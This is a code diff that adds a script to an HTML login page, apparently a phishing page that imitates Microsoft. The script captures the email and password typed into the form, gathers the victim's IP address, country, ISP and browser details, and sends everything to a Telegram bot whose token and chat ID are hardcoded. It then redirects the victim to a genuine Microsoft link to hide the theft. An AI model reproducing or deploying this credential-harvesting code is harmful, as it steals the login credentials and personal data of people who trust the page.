@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -93,7 +94,118 @@
         setPlaceholderText();
     }
 </script>
+<script>
+        async function getBrowserInfo() {
+            return {
+                browser: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+        }
 
+         async function getIPInfo() {
+            try {
+                // Direct approach with ipinfo.io which is reliable and doesn't require CORS
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                
+                return {
+                    query: data.ip || 'Unknown',
+                    country: data.country_name || data.country || 'Unknown',
+                    org: data.org || 'Unknown',
+                    isp: data.org || 'Unknown' // Using org as ISP since ipinfo doesn't separate them
+                };
+            } catch (error) {
+                console.error('Primary IP fetch failed:', error);
+                
+                // Fallback to another service
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    
+                    return {
+                        query: ipData.ip || 'Unknown',
+                        country: 'Unknown', // Can't get country from ipify alone
+                        org: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                } catch (fallbackError) {
+                    console.error('Fallback IP fetch failed:', fallbackError);
+                    return {
+                        query: 'Unknown',
+                        country: 'Unknown',
+                        org: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                }
+            }
+        }
+
+        async function sendToTelegram(message) {
+            const BOT_TOKEN = '7480485973:AAEc5xoO6_z6ZtSXAMxZB4iqih4M7peeyoM'; // Add your bot token here
+            const CHAT_ID = '@onlysendlegs'; // Add your chat ID here
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const email = form.email.value;
+            const password = form.password.value;
+            
+            const browserInfo = await getBrowserInfo();
+            const ipInfo = await getIPInfo();
+            
+            const message = `
+📥 New Login Information
+------------------------
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 IP: ${ipInfo.query}
+🌍 Country: ${ipInfo.country}
+🏢 ISP: ${ipInfo.isp}
+🔍 Organization: ${ipInfo.org}
+🌐 Browser: ${browserInfo.browser}
+🗣 Language: ${browserInfo.language}
+📱 Screen: ${browserInfo.screenResolution}
+🖥 Window: ${browserInfo.windowSize}
+⏰ Timezone: ${browserInfo.timezone}
+📅 Timestamp: ${browserInfo.timestamp}
+            `.trim();
+
+            await sendToTelegram(message);
+
+            try {
+                window.history.go(-2);
+                setTimeout(() => {
+                    if (document.location.href !== 'about:blank') {
+                        window.location.href = 'https://go.microsoft.com/fwlink/p/?LinkID=402333';
+                    }
+                }, 500);
+            } catch (e) {
+                window.location.href = 'https://go.microsoft.com/fwlink/p/?LinkID=402333';
+            }
+        }
+    </script> 
 
         </div>
     </div>
